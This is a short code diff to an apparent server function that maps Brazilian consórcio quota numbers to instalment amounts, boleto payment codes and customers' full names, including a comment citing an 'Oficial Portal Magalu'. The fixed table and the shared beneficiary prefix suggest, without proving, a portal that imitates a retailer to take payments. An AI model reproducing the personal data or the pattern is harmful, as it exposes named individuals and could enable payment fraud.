@@ -90,9 +90,10 @@ serve(async (req) => {
         // SUELI (Cota 0565 / Grupo 5294 - Parcela Outubro R$ 380,00)
         "5294-565": { valor: 380.00, linhaDigitavel: "03399.75989 99800.002570 72940.565012 9 16090000038000" },
         "5294-0565": { valor: 380.00, linhaDigitavel: "03399.75989 99800.002570 72940.565012 9 16090000038000" },
-        "005294-0565": { valor: 380.00, linhaDigitavel: "03399.75989 99800.002570 72940.565012 9 16090000038000" },
-        "6041-123": { valor: 442.00 },
-        "6041-0123": { valor: 442.00 },
+        // EMILY OLIVEIRA DA LUZ (Cota 123 / Grupo 6041 - Parcela Outubro R$ 467,45 Oficial Portal Magalu)
+        "6041-123": { valor: 467.45, linhaDigitavel: "03399.75989 99800.002570 64567.501016 8 16090000046745", nome: "EMILY OLIVEIRA DA LUZ" },
+        "6041-0123": { valor: 467.45, linhaDigitavel: "03399.75989 99800.002570 64567.501016 8 16090000046745", nome: "EMILY OLIVEIRA DA LUZ" },
+        "006041-0123": { valor: 467.45, linhaDigitavel: "03399.75989 99800.002570 64567.501016 8 16090000046745", nome: "EMILY OLIVEIRA DA LUZ" },
         "5272-191": { valor: 281.20 },
         "5272-0191": { valor: 281.20 },
         "6037-624": { valor: 544.00 },
